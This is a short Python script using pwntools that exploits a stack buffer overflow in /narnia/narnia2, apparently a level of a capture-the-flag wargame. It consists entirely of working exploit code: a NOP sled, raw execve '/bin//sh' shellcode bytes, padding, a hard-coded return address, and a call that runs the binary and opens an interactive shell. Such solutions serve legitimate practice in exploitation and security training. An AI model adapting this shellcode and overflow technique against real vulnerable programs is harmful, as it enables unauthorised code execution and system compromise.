from pwn import *

payload = "A"*143 + 'B'*4
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

payload = ""
payload += "\x90"*20 #nopsled
payload += shellcode
payload += "\x90" * (140-20-len(shellcode)) #filler
payload += p32(0xffffd760) #suitable ret @ 0xffffd760

p = process(["/narnia/narnia2", payload])
p.interactive()
